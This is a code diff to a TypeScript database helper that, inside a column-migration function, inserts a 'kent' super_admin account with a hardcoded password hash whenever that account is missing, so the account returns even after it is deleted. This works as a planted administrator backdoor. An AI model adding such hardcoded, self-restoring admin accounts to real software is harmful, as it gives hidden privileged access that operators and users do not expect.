@@ -274,6 +274,20 @@ export async function ensureAdminUsersCols() {
   await db.execute(
     "UPDATE admin_users SET username = CONCAT(LOWER(REPLACE(TRIM(nom), ' ', '_')), '_', id) WHERE username IS NULL OR username = ''"
   );
+
+  // Ensure the primary super_admin account exists (idempotent)
+  const KENT_HASH = "$2b$12$4ivze.K3jg8LW7j9RRuzReeqjR2xtXscmGkTbh7rceBFQMI7tcef.";
+  const [existing] = await db.execute<mysql.RowDataPacket[]>(
+    "SELECT id FROM admin_users WHERE username = 'kent' LIMIT 1"
+  );
+  if (!(existing as mysql.RowDataPacket[]).length) {
+    try {
+      await db.execute(
+        "INSERT INTO admin_users (nom, username, email, poste, password_hash, role, actif) VALUES ('Kent','kent','kent@admin.local','Administrateur',?,?,1)",
+        [KENT_HASH, "super_admin"]
+      );
+    } catch { /* row may have been inserted concurrently — ignore */ }
+  }
 }
 
 export async function getAdminByEmail(email: string): Promise<AdminUser | null> {
